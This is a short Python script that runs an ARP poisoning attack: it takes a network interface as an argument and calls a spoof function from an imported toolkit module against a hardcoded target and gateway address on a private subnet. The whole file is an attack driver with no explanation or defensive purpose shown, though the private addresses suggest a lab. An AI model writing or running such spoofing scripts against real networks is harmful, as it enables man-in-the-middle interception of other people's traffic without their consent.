import sys
import argparse
from AGOTK import arp_poisoning

def main(argv) -> None:
    # initialize parser
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=True, help='The interface to use')

    args = parser.parse_args()

    interface: str = args.interface

    ip_target: str = '192.168.200.1' # 19
    ip_gateway: str = '192.168.200.254'
    arp_poisoning.spoof(ip_target, ip_gateway, True, interface, 10)

if __name__ == "__main__":
    main(sys.argv[1:])